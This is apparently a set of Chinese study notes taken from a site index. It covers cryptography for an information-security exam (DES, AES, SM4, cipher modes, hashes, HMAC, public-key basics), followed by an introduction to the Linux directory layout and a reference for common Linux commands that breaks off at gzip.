多表代替密码：用多个密文字母表，明文中的每一个字母都有多种可能的字母来代替。多表代替密码的密钥就是这组映射函数或密文字母表，比如著名的 Vigenre（维吉尼亚）密码。 Vigenre（维吉尼亚）密码的代替规则是用明文字母在 Vigenre 方阵中的列和密钥字母在 Vigenre 方阵中的行的交点处的字母来代替该明文字母。 代数密码：Vernam（维尔南）密码的明文、密钥和密文均用二元数字序列表示。设明文 M =（m~0~，m~1~，...，m~n-1~），密钥 K =（k~0~，k~1~，...，k~n-1~），密文 C =（c~0~，c~1~，...，c~n-1~），其中 m~i~，k~i~，c~i~ ∈ GF(2)，则 c~i~ = m~i~ ⊕ k~i~ ，i = 0,1,...,n-1；Vernam 密码的加密和解密非常简单，而且特别适合计算机和通信系统的应用。 Vernam 密码经不起己知明文攻击。这是因为只要知道了某些明文-密文对，便可以迅速确定出相应的密钥。如果同一密钥重复使用或密钥本身包含重复，则 Vernam 密码将是不安全的。据此，为了增强 Vernam（维尔南）密码的强度，应当避免密钥重复使用，避免密钥本身包含重复。一种极端情况是：①密钥是真正的随机序列；②密钥至少和现文一样长；③一个密钥只使用一次。如果能够做到这些，则密码就是绝对不可破译的了。 古典密码的破译方法： 穷举分析 加法密码：对 K 的可能取值逐一穷举 乘法密码：密钥 K 要满足条件（n，k）= 1 仿射密码：密钥 K 有 26×12-1 = 311 种 统计分析 单代替密码的破译大致过程是：首先统计密文的各种统计特征；其次分析双字母、三字母密文组，以区分元音和辅音字母；最后分析字母较多的密文。 分组密码 分组密码将明文 M 划分为一系列的明文块 M~i~ ，通常每块包含若干位或字符，并且对每一块都用同一个密钥K~e~进行加密。 序列密码将明文和密钥都划分为位 (bit) 或字符的序列，并且对于明文序列中的每一位或字符都用密钥序列中的对应分量来加密。 分组密码每一次加密一个明文块，而序列密码每一次加密一位或一个字符。分组密码和序列密码在计算机系统中都有广泛的应用。序列密码是要害部门使用的主流密码，而商用领域则多用分组密码。 DES 算法 DES 是一种分组密码。明文、密文和密钥的分组长度都是 64 位。 DES 是面向二进制的密码算法。因而能够加解密任何形式的计算机数据。 DES 是对合运算，因而加密和解密共用同一算法，从而使工程实现的工作量减半。 Feistel 结构。 DES 加密过程 子密钥产生过程（详见《信息安全工程师5天修炼》P42） 种子密钥长 64 位，实际使用 56 位，密钥中位置为 8 的整数倍的奇偶校验位共 8 个。 64 位密钥经过置换选择PC1（64→56位）、循环左移（56位）、置换选择PC2（56→48位），产生16个长48位的子密钥K~1~~K~16~ 加密函数f：选择运算 E 把 R~i-1~ 的 32 位扩展到 48 位，并与 48 位子密钥 K~i~ 进行异或运算；然后通过S盒变换，将 48 位输入变为 32 位输出；最后进行置换运算P将S盒的 32 位输出进行一次置换。 S盒变换： 例如：当 S~1~ 盒输入为 “111000” 时，则第 1 位与第 6 位组成二进制串 “10”（十进制2），中间四位组成二进制 “1100”（十进制12）。查询 S~1~ 盒的 2 行 12 列，得到数字 3 ，得到二进制数是 0011 。输入 6 位，输出 4 位。 DES 的安全性 如果 DES 密钥太短则经不起穷举攻击。 DES 存在弱密钥和半弱密钥。 弱密钥：K~1~=K~2~=...=K~16~；弱密钥不受任何循环移位的影响，并且只能得到相同的子密钥，由全 0 或全 1 组成的密钥显然是弱密钥，子密钥生成过程中被分割的两部分分别为全 0 或全 1 时也是弱密得，DES 算法并且存在 4个弱密钥。 半弱密钥：由其产生的子密钥有些相同但不完全相同。有些种子密钥只能生成两个不同的子密钥，这样的种子密钥K称为半弱密钥，DES 至少存在 12 个半弱密钥。半弱密钥将导致把明文加密成相同的密文。 3DES 3DES 是 DES 的扩展，是执行看三次的 DES。3DES 安全强度较高，可以抵抗穷举攻击，但是用软件实现起来速度比较慢。 3DES 的两种加密方式 第一、第三次加密使用同一密钥，这种加密方式的密钥长度为 128 位（ 112 位有效） 三次加密使用不同密钥，这种加密方式的密钥长度为 19 2位（ 168 位有效） AES 算法 数据长度可变 AES 中一般将明文、密文分组长度固定为 128 位。 密钥长度可以为 128、192 或 256 位。 SP 结构。 AES 算法框架 明文State，二维矩阵表示，该数组为 4 行，N~b~ 列，设为 4 × N~b~ ；数组每个元素为 1 个字节，即为 2 个十六进制数。N~b~ = 数据块长度/32。 密钥State，二维矩阵表示，该数组为 4 行，N~k~ 列，设为 4 × N~k~ ；数组每个元素为 1 个字节，即为 2 个十六进制数。N~k~ = 数据块长度/32。 加密轮数 N~r~ ，取决于明文块和密钥块的长度。当明文块和密钥块的长度都为 128 位时，迭代次数为 10 次；当明文块或密钥块的长度为 192 位时，迭代次数为 12 次；当明文块或密钥块的长度为 256 位时，迭代次数为 14 次。 加密：首先执行“子密钥加”算法；然后进行 n-1 轮加密操作，每轮包含”字节代换“、”行移位“、”列混淆“、”子密钥加“；第 n 轮加密操作少了一步”列混淆“。 解密：执行的是逆过程，算法不完全一致。AES 不是对合运算，即 (AES)^-1^ ≠ AES 子密钥加（最初）：明文分组与种子密钥按位进行异或运算。 字节代换ByteSub：输入State中的每一个字节，通过查询S盒替换成新的State。如当前State某元素为 “51” 是指查询S盒的第 5 行第 1 列，得到 “D1” 。 行位移变换ShiftRow： 当明文长度为 128、192 位时，State矩阵第 0 行循环左移 0 字节，第 1 行循环左移 1 字节，第 2 行循环左移 2 字节，第 3 行循环左移 3 字节。 当明文长度为 256 位时，State矩阵第 0 行循环左移 0 字节，第 1 行循环左移 1 字节，第 2 行循环左移 3 字节，第 3 行循环左移 4 字节。 列混淆Mixcolimn：列混淆是对状态的列进行混合变换。把状态中的每一列看作 GF(2^8^) 上的多项式，并与一个固定多项式 c(x) 相乘然后模多项式扩 x^4^+1 ，其中 c(x) 为：c(x) = '03'x^3^ + '01'x^2^ + '01'x + '02' ,只有 c(x) 与 x^4^+1 是互素的，才能保证 c(x) 存在逆多项式 d(x) ，只有逆多项式 d(x) 的存在，才能正确进行解密。 子密钥加（轮函数）AddRoundKey：中间State与该轮子密钥进行异或运算。 解密过程 逆行位移InvShiftRow：State矩阵第 0 行循环右移 0 字节，第 1 行循环右移 1 字节，第 2 行循环右移 2 字节，第 3 行循环右移 3 字节。 逆字节代换InvByteSub：通过查询逆S盒实现。 AddRoundKey的逆就是它自己。 逆列混淆InvMixColumn：把状态的每列都乘以一个固定的多项式 d(x)： d(x) ='OB' X^3^ + 'OD' X^2^ + '09x' + 'OE' ，即 S'(x) = d(x)s(x) mod (x^4^ + 1) 。 AES算法的安全性 不存在弱密钥 该算法对密钥的选择没有任何限制，还没有发现弱密钥和半弱密钥的存在。 抗攻击能力强 可抗击穷举密钥的攻击。因为AES的密钥长度可变，针对 128/192/256bit 的密钥，密钥量为 2^128^/2^192^/2^256^ ，足以抵抗穷举搜索攻击。 可抗击线性攻击，经 4 轮变换后，线性分析就无能为力了。 可抗击差分攻击，经 8 轮变换后，差分攻击就无从着手了。 适应性强 数据块长度和密钥长度都可变，因此能够适应不同的安全应用环境。 SM4 算法 2006 年我国国家密码管理局公布了无线局域网产品使用的 SM4 密码算法。 SM4 的数据分组长度和密钥长度都是 128 位。 加密算法与密钥扩展算法都采用 32 轮迭代结构。 SM4 密码算法以字节（8 位）和字（32 位）为单位进行数据处理。 SM4 密码算法是对合运算，解密算法与加密算法相同，只是轮密钥的使用顺序相反。 非对称 Feistel 结构。 基本运算 模 2 加：⊕ ，32 位异或运算 循环移位： SM4 算法框架 密码部件 S 盒：SM4 的 S 盒是一种以字节为单位的非线性代替变换，其密码学的作用在于起到混淆的作用。S 盒的输入和输出都是 8 位的字节。它本质上是 8 位的非线性置换。设输入字节为 \"bf\" ，则查询 S 盒表的 b 行 f 列，得到输出字节为 \"51\" ；即 S_Box ('bf') = '51' 非线性变换 τ ：SM4 的非线性变换 τ 是一种以字为单位的非线性代替变换。它由 4 个 S 盒并置构成。本质上它是 S 盒的一种并行应用。 线性变换部件 L ：线性变换部件 L 是以字为处理单位的线性变换部件，其输入输出都是 32 位的字。其密码学的作用在于起到扩散的作用。 合成变换 T ：合成变换 T 由非线性变换 τ 和线性变换 L 复合而成，数据处理的单位是字。 轮函数：SM4 密码算法采用对基本轮函数进行迭代的结构。利用上述基本密码部件，便可构成轮函数。SM4 密码算法的轮函数是一种以字为处理单位的密码函数。轮函数的输入为 4 个 32 位字，共 128 位。轮密 rk 也是一个 32 位的字。轮函数的输出也是一个 32 位的字。 三种算法的对比 DES AES SM4 明文分组长度 64 位 128 位 128 位 密钥长度 64（56）位 128 位、192 位、256 位 128 位 子密钥长度 16 × 48 位 4 × N~k~ 二维矩阵，N~k~ = 数据块长度/32 32 × 32 位 算法结构 Feistel 结构 SP 结构 非对称 Feistel 结构 对合运算？ √ X √ 密码部件 加密函数：选择运算E、异或运算、S盒变换、置换运算P 加密函数：字节代换（S盒变换），行位移变换，列混淆，子密钥加 加密函数：S盒变换，非线性变换 τ，线性变换部件 L，合成变换 T 分组密码工作模式 分组密码工作模式是指以某个分组密码算法为基础，解决对任意长度的明文的加密问题的方法。 电码本模式 ECB 直接利用分组密码对明文的各分组进行加密。 特点： 要求数据的长度是密码分组长度的整数倍，否则最后一个数据块将是短块，需要特殊处理。 非常适合处理短数据加密，适合并行计算。 容易暴露明文的数据模式。 同一明文分组对应的密文分组也相同。 密码分组链接模式 CBC 特点： 要求数据的长度是密码分组长度的整数倍，否则最后一个数据块将是短块，需要特殊处理。 解决了 ECB 的安全缺陷，可以让重复的明文分组产生不同的密文分组。 明密文链接方式 除初始向量外，输入是前一组的密文和前一组的明文异或后，再与当前的明文组异或。 加解密均会引发错误传播无界（明文或密文错误会引发后续数据全部错误） 密文链接方式 除初始向量外，输入是前一组的密文与当前明文组的异或。 加密错误会引发错误传播无界，解密错误会引发错误传播有界（明文或密文错误只产生有限几个数据错误） 输出反馈模式 OFB 特点： 这种工作模式的安全性取决于分组密码本身的安全性。其将一个分组密码转换为一个序列密码。 它具有普通序列密码的优缺点，如没有错误传播。设加/解密时错了一位，则只影响密/明文中对应一位，不影响其他位。但因无错误传播而对密文的篡改难以检测。 适于加密冗余度较大的数据，如语音和图像数据。 工作原理： 种子 I~0~ 的值赋值为位移寄存器 R 的初值。 利用分组算法 E（如DES、AES、SM4）加密移位寄存器 R 中的内容为密文，并 “选取最右边的 S 位” 作为输出，与明文 m~i~ 异或得到 C~i~ 。 移位寄存器 R 先左移 S 位，然后将加密算法 E 输出的最右 S 位赋值到寄存器 R 的右 S 位。 继续②③步，直到把分组密码变为序列密码。 密码反馈模式 CFB 特点： CFB 与 OFB 模式相似，不同的是填充移位寄存器 R 的不是加密算法 E 输出的最右 S 位，而是 E 输出与明文异或后的密文 C~i~ 的 S 位。 CFB 模式的加解密具有错误传播无界的特性，使得密文反馈工作模式适合数据完整性认证方面的应用。 计数器模式 CTR 特点： CTR 模式与 OFB 和 CFB 一样，把分组密码转化为序列密码，按序列密码的方式进行加解密。 CTR 模式的加密算法是对合运算，加解密过程仅涉及加密运算，不涉及解密运算。 优点是可并行、效率高、适合任意长度的数据、加解密速度快，而且在加解密处理方式上适合随机存取数据的加解密。因此，特别适合计算机随机文件的加密，因为随机文件要求能随机地访问。这对数据库加密是有重要意义的。 缺点是没有错误传播，因此不适合用于数据完整性认证。 序列密码 序列密码又称流密码，原理是明文流与密钥流按顺序逐比特进行异或运算，从而产生密文流。 序列密码的加密和解密运算只是简单的模二加运算，所以序列密码的强度依靠密钥序列的随机性和不可预测性。序列密码中的关键是要保持通信双方的精确同步。 序列密码的加密和解密运算是对合运算。 位移寄存器 待补充 RC4 序列密码算法 RC4 是一种密钥流产生算法。 RC4 密码与基于移位寄存器的序列密码不同，它是一种基于非线性数据表变换的序列密码。 RC4 包含两个算法：密钥调度算法（KSA）和伪随机生成算法（PRGA） 祖冲之算法 ZUC 该算法是我国第一个成为国际密码标准的密码算法，成为 3GPP LTE 第三套加密标准核心算法。该算法由比特重组、非线性函数 F、线性反馈位移寄存器（LFSR）组成。该算法输出序列的随机性好，周期足够大；可以抵抗已知的序列密码分析，可抵抗弱密分析。 Hash 函数 Hash 函数又称哈希函数、散列函数，是将任意长度的消息输出为定长的 hash码。Hash 函数用于构建数据的“指纹”，主要用于数据完整性、数字签名、消息认证等。 特性： 单向性：已知 hash 函数值 h ，求 H(x) = h 的 x 在计算上是不可行的。由 Hash 值不能得出相应的报文。 抗弱碰撞性：对任何给定的数据 x ，找到满足 y ≠ x 且 H(x) = H(y) 的 y 在计算上是不可行的。不能找到与给定报文具有相同 Hash 值的另一个报文。 抗强碰撞性：两个不同消息 m 和 m' ，使得 H(m) = H(m') 在计算上是不可行的。（抵抗生日攻击的能力强弱）不同的报文所得到的 Hash 值是不同的。 MD5 算法 其消息分组长度为 512 位，生成 128 位的摘要。 SHA 算法 安全 Hash 算法（SHA）其输入为长度小于 2^64^ 位的报文，该算法对报文按 512 位为单位分组处理，输出为 160 位的报文摘要。 算法步骤： 填充报文：使报文长度与 448 模 512 同余（即长度 = 448 mod 512）。若报文本身已经满足上述要求，仍然需要进行填充（例如：若报文长度为 448 位，则仍需填充 512 位使其长度为 960 位），因此填充位数在 1 和 512 之间。填充方法是在报文后附加一个 1 和若干个 0 。然后附上表示填充前报文长度的 64 为数据（最高有效位在前）。需满足总长度：≤ 2^64^ - 1 初始化缓冲区：初始化 5 个 32 位的寄存器。 执行算法主循环：每次循环处理 512 位的分组。核心算法是具有 4 轮操作的压缩函数。循环次数是报文填充后的分组数。 输出：输出 160 位的摘要。 SM3 算法 SM3 算法是国家密码管理局与 2010 年颁布的安全密码杂凑算法。基本迭代结构采用了增强型的 Merkle-Damgard 结构，把长度 的信息，经过填充和迭代压缩，生成长度为 256 位的摘要。2018 年 10 月，SM3 正式成为国际标准。SM3 算法可用于数字签名和验证、消息认证码的生成与验证以及随机数的生成。 HMAC 消息完整性：指数据正确无误、完整不缺，使数据免受未授权的毁坏，就是确保数据的完整性。 消息认证码 MAC MAC 是基于消息和秘密钥的公开函数，其输出是固定长度的短数据块。MAC 和加密类似，需要明文、密钥、算法，但 MAC 算法不要求可逆性，而加密算法则要求可逆。 假定通信双方共享秘密钥 K ，发送方 A 向接收方 B 发送报文 M 并附上 MAC，记为：A→B：M║MAC 。接收方 B 到报文后用相同的秘密钥 K 和报文 M 进行相同的计算得出新的 MAC' ，若 MAC‘ = MAC，则： 接收的报文 M 没有被修改 接收的报文 M 是 A 所发送的 HMAC：Hash 消息认证码，是一种基于密钥和散列函数进行消息认证的方法。它要求通信双方共享密钥、约定算法、约定报文 Hash 运算（如MD5、SHA、SM3等）。 公钥密码体制 加密密钥和解密密钥不相同的算法，称为非对称加密算法，又称为公钥密码体制，解决了对称密钥算法的密钥分配与发送问题。公钥用于加密和认证，私钥用于解密和签名。公钥可以公开，私钥需要严格保密。 单向函数（MD5、SHA、SM3）加密效率高，但加密后不能还原： 已知 x ，要计算 y 很容易 已知 y ，要计算出 x 很难 单向陷门函数需满足： 具有陷门 已知 x ，要计算 y 很容易 已知 y ，如果不知道陷门，要计算出 x 很难；如果真的陷门，则计算出 x 很容易 实际上已找到的单向性足够的函数有： 因子分解问题：计算素数乘积容易（p×q→n），而计算因子分解困难（n→p×q） 离散对数问题：计算素数幂乘容易（x^y^→z），而计算对数困难（log~x~z→y） 公钥密码体制的特点： 明文 M 通过加密算法 E 和加密密钥 K~e~ 变成密文 C 用公式表示为：C = E (M,K~e~) 密文 C 通过解密算法 D 和解密密钥 K~d~ 还原为明文 M 用公式表示为：M = D (C,K~d~) 计算上不能由 K~e~ 求出 K~d~ 加密算法 E 和解密算法 D 都是高效的 数字信封技术：发送方将用对称密钥加密的密文和用接收方的公钥加密后的对称密钥密文发送给接收方；接收方用自己的私钥对对称密钥密文进行解密得到对称密钥，然后再对密文进行解密。适用于传输大量加密数据。 数字签名：发送方先用对方的公钥对明文进行加密成密文，接着使用自己的私钥对明文进行加密生成数字签名，然后将密文和数字签名发送给接收方；接收方使用对方的公钥对数字签名进行解密，然后与密文进行对比确认信息是否由发送方发送，再用自己的私钥还原明文。 RSA 密码 距离考试只有两个月时间了，居然说教材和大纲都要改版，难受......就这样了吧，第一版end. Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2020-08-31 21:14 "},"兄弟连Linux/Linux系统简介.html":{"url":"兄弟连Linux/Linux系统简介.html","title":"Linux系统简介","keywords":"","body":"Linux系统简介 以下均为Linux-CentOS为例 系统分区 磁盘分区 磁盘分区是使用分区编辑器（partition editor）在磁盘上划分几个逻辑部分。碟片一旦划分成数个分区（Partition），不同类的目录与文件可以存储进不同的分区。 分区类型 主分区：最多只能有4个 扩展分区： 最多只能有1个 主分区加扩展分区最多有4个 不能写入数据，只能包含逻辑分区逻辑分区 逻辑分区 从5开始 格式化 格式化（高级格式化）又称逻辑格式化，它是指根据用户选定的文件系统（如Windows：FAT16、FAT32、NTFS、Linux：EXT2、EXT3、EXT4等），在磁盘的特定区域写入特定数据，在分区中划出一片用于存放文件分配表、目录表等用于文件管理的磁盘空间。 Linux不靠扩展名区分文件类型 压缩包：“*.gz”、“*.bz2”、“*.tar.bz2”、“*.tgz”等 二进制软件包：“.rpm” 网页文件：“.html”、“.php” 脚本文件：“*.sh” 配置文件：“*.conf” 服务器注意事项 远程服务器不允许关机，只能重启 重启时应该关闭服务 不要在服务器访问高峰运行高负载命令 远程配置防火墙时不要把自己踢出服务器 指定合理的密码规范并定期更新 合理分配权限 定期备份重要数据和日志 目录介绍 /bin/：存放系统命令的目录，普通用户和超级用户都可以执行。不过放在/bin下的命令在单用户模式下也可以执行 /sbin/：保存和系统环境设置相关的命令，只有超级用户可以使用这些命令进行系统环境设置，但是有些命令可以允许普通用户查看 /usr/bin/：存放系统命令的目录，普通用户和超级用户都可以执行。这些命令和系统启动无关，在单用户模式下不能执行 /usr/sbin/：存放根文件系统不必要的系统管理命令，例如多数服务程序。只有超级用户可以使用。大家其实可以注意到Linux的系统，在所有“sbin”目录中保存的命令只有超级用户可以使用，“bin”目录中保存的命令所有用户都可以使用 /boot/：系统启动目录，保存系统启动相关的文件，如内核文件和启动引导程序（grub）文件等 /dev/：设备文件保存位置。我们已经说过Linux中所有内容以文件形式保存，包括硬件。那么这个目录就是用来保存所有硬件设备文件的 /etc/：配置文件保存位置。系统内所有采用默认安装方式（rpm安装）的服务的配置文件全部都保存在这个目录当中，如用户账户和密码，服务的启动脚本，常用服务的配置文件等 /home/：普通用户的家目录。建立每个用户时，每个用户要有一个默认登录位置，这个位置就是这个用户的家目录，所有普通用户的家目录就是在/home下建立一个和用户名相同的目录。如用户user1的家目录就是/home/user1 /lib/：系统调用的函数库保存位置 /lost+found/：当系统意外崩溃或机器意外关机，而产生一些文件碎片放在这里。当系统启动的过程中fsck工具会检查这里，并修复已经损坏的文件系统。这个目录只在每个分区中出现，例如/lost+found就是根分区的备份恢复目录，/boot/lost+found就是/boot分区的备份恢复目录 /media/：挂载目录。系统建议是用来挂载媒体设备的，例如软盘和光盘 /mnt/：挂载目录，早期Linux中只有这一个挂载目录，并没有细分。现在这个目录系统建议挂载额外设备，如U盘，移动硬盘和其他操作系统的分区 /misc/：挂载目录。系统建议用来挂载NFS服务的共享目录。我们在刚刚已经解释了挂载。童鞋们应该知道只要是一个已经建立的空目录就可以作为挂载点。那么系统虽然准备了三个默认挂载目录/media、/mnt、/misc，但是到底在哪个目录中挂载什么设备都可以由管理员自己决定。例如超哥接触Linux的时候，默认挂载目录只有/mnt一个，所以养成了在/mnt下建立不同目录挂载不同设备的习惯。如/mnt/cdrom挂载光盘，/mnt/usb挂载U盘，这都是可以的 /opt/：第三方安装的软件保存位置。这个目录就是放置和安装其他软件的位置，我手工安装的源码包软件都可以安装到这个目录当中。 /proc/：虚拟文件系统，该目录中的数据并不保存到硬盘当中，而是保存到内存当中。主要保存系统的内核，进程，外部设备状态和网络状态灯。如/proc/cpuinfo是保存CPU信息的，/proc/devices是保存设备驱动的列表的，/proc/filesystems是保存文件系统列表的，/proc/net/是保存网络协议信息的 /sys/：虚拟文件系统。和/proc目录相似，都是保存在内存当中的，主要是保存于内核相关信息的 /root/：超级用户的家目录。普通用户家目录在“/home”下，超级用于家目录直接在“/”下 /srv/：服务数据目录。一些系统服务启动之后，可以在这个目录中保存所需要的数据 /tmp/：临时目录。系统存放临时文件的目录，该目录下所有用户都可以访问和写入。我们建议此目录中不能保存重要数据，最好每次开机都把该目录清空 /usr/：系统软件资源目录。注意usr不是user的缩写，而是“Unix Softwre Resource”的缩写，所以不是存放用户数据，而是存放系统软件资源的目录。系统中安装的软件大多数保存在这里，所以除了/usr/bin/和/usr/sbin/这两个目录，我在介绍几个/usr/下的二级目录 /var/：动态数据保存位置。主要保存缓存、日志以及软件运行所产生的文件 Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2020-07-20 15:28 "},"兄弟连Linux/Linux常用命令.html":{"url":"兄弟连Linux/Linux常用命令.html","title":"Linux常用命令","keywords":"","body":"Linux常用命令 文件处理命令 目录处理命令：ls【ll 为 ls -ld 缩写】 命令名称：ls 命令英文原意：list 命令所在路径：/bin/ls 执行权限：所有用户 功能描述：显示目录文件 语法：ls 选项[-ald] [文件或目录] -a 显示所有文件，包括隐藏文件 -l 详细信息显示 -d 查看指定目录属性 -i 查看文件i节点（一个文件一定一个i节点，一个i节点不一定只对应一个文件） -rw-r--r-- 开头标识文件类型，-二进制文件 d目录 l软链接文件,read，write，execute 目录处理命令：mkdir 命令名称：mkdir 命令英文原意：make directories 命令所在路径：/bin/mkdir 执行权限：所有用户 语法：mkdir -p [目录名] 功能描述：创建新目录，-p 递归创建 范例： $mkdir -p /tmp/Japan/boduo $mkdir /tmp/Japan/longze /tmp/Japan/cangjing 目录处理命令：cd 命令名称：cd 命令英文原意：change directory 命令所在路径：shell内置命令 执行权限：所有用户 语法：cd [目录] 功能描述：切换目录 范例： $cd /tmp/Japan/boduo 切换到指定目录 $cd .. 回到上一级目录 目录处理命令：pwd 命令名称：pwd 命令英文原意：print working directory 命令所在路径：/bin/pwd 执行权限：所有用户 语法：pwd 功能描述：显示当前目录 文件处理命令：rmdir 命令名称：rmdir 命令英文原意：remove empty directories 命令所在路径：/bin/rmdir 执行权限：所有用户 语法：rmdir [目录名]。 功能描述：删除空目录 范例：$rmdir /tmp/Japan/boduo 目录处理命令：cp 命令名称：cp 命令英文原意：copy 命令所在路径：/bin/cp 执行权限：所有用户 语法：cp -rp [原文件或目录] [目标目录] -r 复制目录 -p 保留文件属性 功能描述：复制文件或目录 目录处理命令：mv 命令名称：mv 命令英文原意：move 命令所在路径：/bin/mv 执行权限：所有用户 语法：mv [原文件或目录] [目标目录] 功能描述：剪切文件、改名 目录处理命令：rm 命令名称：rm 命令英文原意：remove 命令所在路径：/bin/rm 执行权限：所有用户 语法：rm -rf [文件或目录] -r 删除目录 -f 强制执行 功能描述：删除文件 文件处理命令：touch 命令名称：touch 命令所在路径：/bin/touch 执行权限：所有用户 语法：touch [文件名] 功能描述：创建空文件 范例：$touch Japanlovestory.list 创建带空格的文件名时要带“”如：“program files”（不建议文件名带空格） 文件处理命令：cat/tac 命令名称：cat/tac 命令所在路径：/bin/cat 执行权限：所有用户 语法：cat [文件名] / tac [文件名] 功能描述：显示文件内容 / 反向显示文件内容 -n 显示行号 范例： $cat-n /etc/services 、tac /etc/services 文件处理命令：more 命令名称：more 命令所在路径：/bin/more 执行权限：所有用户 语法：more [文件名] （空格）或f 翻页 b 回翻 （Enter） 换行 q或Q 退出 功能描述：分页显示文件内容 范例：$more /etc/services 文件处理命令：less 命令名称：less 命令所在路径：/usr/bin/less 执行权限：所有用户 语法：less [文件名] 空格、f、pg on 翻页 b、pg up 回翻 Enter、↑、 ↓ 换行 q或Q 退出 /关键词 搜索（按n换页继续搜索） 功能描述：分页显示文件内容（可向上翻页） 范例：$less /etc/services 文件处理命令：head 命令名称：head 命令所在路径：/usr/bin/head 执行权限：所有用户 语法：head [文件名] 功能描述：显示文件前面几行（默认10行） -n 指定行数 范例：$head -n 20 /etc/services 文件处理命令：tail 命令名称：tail 命令所在路径：/usr/bin/tail 执行权限：所有用户 语法：tail [文件名] 功能描述：显示文件后面几行 -n 指定行数 -f 动态显示文件末尾内容 范例：$tail -n 18 /etc/services 文件处理命令：ln 命令名称：ln 命令英文原意：link 命令所在路径：/bin/ln 执行权限：所有用户 语法：ln -s [原文件] [目标文件] -s 创建软链接 功能描述：生成链接文件 范例： $ln -s /etc/issue /tmp/issue.soft 创建文件/etc/issue的软链接/tmp/issue.soft $In /etc/issue /tmp/issue.hard 创建文件/etc/issue的硬链接/tmp/issue.hard 软连接特征：（类似Windows快捷方式） lrwxrwxrwx 软连接文件权限都为777 文件大小-只是符号链接 /tmp/issue.soft -> /etc/issue箭头指向源文件 硬链接特征： 功能=cp -p命令+同步更新（其中一个文件删除或丢失不影响另一个文件） 通过i节点识别（i节点相同） 不能跨分区 不能针对目录使用 权限管理命令 权限管理命令：chmod 命令名称：chmod 命令英文原意：change the permissions mode of a file 命令所在路径：/bin/chmod 执行权限：所有者、root 语法： chmod [{ugoa}{+-=}{rwx}] [文件或目录] chmod [mode=421] [文件或目录] -R 递归修改 例如： chmod u+x,a-x 文件名 chmod 421 文件名 功能描述：改变文件或目录权限 权限管理命令：chown 命令名称：chown 命令英文原意：change file ownership 命令所在路径：/bin/chown 执行权限：root 语法：chown [用户] [文件或目录] 功能描述：改变文件或目录的所有者 权限管理命令：chgrp 命令名称：chgrp 命令英文原意：change file group ownership 命令所在路径：/bin/chgrp 执行权限：root 语法：chgrp [用户组] [文件或目录] 功能描述：改变文件或目录的所属组 权限管理命令：umask 命令名称：umask 命令英文原意：the user file-creation mask 命令所在路径：Shell内置命令 执行权限：所有用户 语法：umask [-S] -S 以rwx形式显示新建文件缺省权限 功能描述：显示、设置文件的缺省权限 范例： $umask -S $umask 077 修改文件缺省权限为rwx --- --- 注意：touch 一个新文件默认是没有执行权限的 文件搜索命令 文件搜索命令：find（最可靠，但占用系统资源高） 命令名称：find 命令所在路径：/bin/find 执行权限：所有用户 语法：find [搜索范围] [匹配条件] 功能描述：文件搜索 例如： $ find /etc -name init 在目录/etc中查找文件init -iname 不区分大小写 $ find /etc -name *init* 在目录/etc中查找文件名含有init的文件（*匹配任意字符，？匹配单个字符） $ find / -size +204800 在根目录下查找大于100MB的文件【1K=2数据块(512字节=0.5K)】 +n 大于 -n 小于 n等于 $ find /home -user shenchao 在根目录下查找所有者为shenchao的文件 -group 根据所属组查找 $ find /etc -cmin -5 在/etc下查找5分钟内被修改过属性的文件和目录（+5超过5分钟） -amin 访问时间access -cmin 文件属性change -mmin 文件内容modify $ find /etc -size +163840 -a -size -204800 在/etc下查找大于80MB小于100MB的文件 -a 两个条件同时满足and -o 两个条件满足任意一个即可or $ find /etc -name 文件名 -exec ls -l {} \\； 在/etc下查找inittab文件并显示其详细信息 -exec或者-ok 命令 {} \\；对搜索结果执行操作（-ok会对操作进行询问） $ find /etc -name init* -a -type f 查找以init开头的文件 -type 根据文件类型查找。 f 文件，d 目录，l 软链接文件 -inum 根据i节点查找 文件搜索命令：locate 命令名称：locate 命令所在路径：/usr/bin/locate 执行权限：所有用户 语法：locate 文件名 功能描述：在文件资料库中查找文件 范例：$locate -i inittab （-i不区分大小写） 特点：速度快，但不能实时查找，应该对文件库手动更新updatedb。且无法查找/tmp目录下的内容 文件搜索命令：which 命令名称：which 命令所在路径：/usr/bin/which 执行权限：所有用户 语法：which 命令 功能描述：搜索命令所在目录及别名信息 范例：$which ls 文件搜索命令：whereis 命令名称：whereis 命令所在路径：/usr/bin/whereis 执行权限：所有用户 语法：whereis [命令名称] 功能描述：搜索命令所在目录及帮助文档路径 范例：$whereis ls 文件搜索命令：grep 命令名称：grep 命令所在路径：/bin/grep 执行权限：所有用户 语法：grep -iv [指定字串] [文件] 功能描述：在文件中搜寻字串匹配的那行内容并输出 -i 不区分大小写 -v 排除指定字符串所在行 如：grep -v ^# /etc/inittab 把以#开头的行去掉 范例：#grep mysql /root/install.log 帮助命令 帮助命令：man、info 命令名称：man、info 命令英文原意：manual 命令所在路径：/usr/bin/man 执行权限：所有用户 语法：man或info [命令或配置文件名称（不用路径）] 功能描述：获得帮助信息 范例： $man ls 查看1s命令的帮助信息 $man services 查看配置文件services的帮助信息 $man 5 passswd 查看配置文件passwd的帮助信息（1 命令的帮助 5 配置文件的帮助） 帮助命令：whatis 命令名称：whatis 功能描述：查看命令的简短介绍信息 范例： $whatis ls 查看ls命令的简短介绍信息 帮助命令：apropos 命令名称：apropos 功能描述：查看配置文件的简短介绍信息 范例： $apropos inittab 查看inittab的简短介绍信息 帮助命令：--help 命令名称：--help 功能描述：查看命令的介绍信息 范例： $touch --help 查看touch命令的介绍信息 帮助命令：help 命令名称：help 命令所在路径：Shell内置命令 执行权限：所有用户 语法：help命令 功能描述：获得Shell内置命令的帮助信息 范例： $help umask 查看umask命令的帮助信息 用户管理命令 用户管理命令：useradd 命令名称：useradd 命令所在路径：/usr/sbin/useradd 执行权限：root 语法：useradd 用户名 功能描述：添加新用户 范例：$useradd yangmi 用户管理命令：passwd 命令名称：passwd 命令所在路径：/usr/bin/passwd 执行权限：所有用户 语法：passwd 用户名 功能描述：设置用户密码 范例：$passwd yangmi 用户管理命令：who 命令名称：who 命令所在路径：/usr/bin/who 执行权限：所有用户 语法：who 功能描述：查看登录用户信息 范例：$who 【如下：登录用户名；tty为本地登录，pts为远程登录；ID；登录时间及IP】 none :0 2019-11-11 21:09 (:0) none pts/1 2019-11-11 21:15 (192.168.31.144) 用户管理命令：w 命令名称：w 命令所在路径：/usr/bin/w 执行权限：所有用户 语法：w 功能描述：查看登录用户详细信息 压缩解压命令 压缩命令：gzip 【zip格式Linux和Windows都可直接用】 命令名称：gzip 